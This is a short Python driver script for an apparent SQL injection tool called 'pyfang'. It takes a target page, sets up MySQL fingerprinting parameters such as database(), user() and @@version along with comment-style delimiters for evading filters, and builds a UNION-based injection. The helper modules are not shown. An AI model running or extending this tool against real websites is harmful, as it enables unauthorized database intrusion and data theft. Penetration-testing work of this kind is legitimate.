#!/usr/bin/python
"""
    Driver program for pyfang. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f:     \n-delimited text file of parameters to inject (default is mysql_params).
        -d:     Delimiter to use. Default is '/**/', also can use:
                                             '%20' 
        -db:    Database to try injections against (default is MySQL). Only MySQL supported as of now.
        -v:     Verbose mode.

"""
import os, sys, urllib2
import pf_builder, pf_injection, pf_parser
import json

if __name__ == '__main__':

    page = sys.argv[1]

    # Dicts of useful params for various DBs. 
    # Turn into text files so user can use their own.
    mysql_params = ['database()', 'user()', '@@version', '@@datadir', '@@hostname']
    # 'from information_schema.columns'

    inj = pf_injection.Injector("")
    b = pf_builder.Builder(page, mysql_params)
    print b.build_union_injection(4,2)
    #print results['database()']

